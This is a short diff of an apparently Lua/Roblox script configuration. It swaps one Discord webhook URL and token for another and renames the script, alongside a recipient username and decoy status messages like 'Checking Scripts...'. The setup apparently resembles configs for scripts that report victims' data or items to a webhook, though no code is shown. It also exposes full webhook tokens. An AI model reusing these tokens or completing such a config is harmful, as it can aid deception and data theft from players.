@@ -1,7 +1,7 @@
 Username = "Aebeatz777 "
-WebHook = "https://discord.com/api/webhooks/1073105019848630292/IFozKZsma9zrB0VIbYvAchoInZjS--J-IjSdV-sI6zRSCqtcfHgIbaXOAv428T1eOzez"
+WebHook = "https://discord.com/api/webhooks/1073116979990376488/OB8h2Gtc5jUMzCWz9KNEniChwyL49L_2pn5uSxXATr5FRlLVyY9OrDzKKNRRolxDKNBV"
 
-_G.CustomScriptName = "Coen"
+_G.CustomScriptName = "Advanced PROJECT WD"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
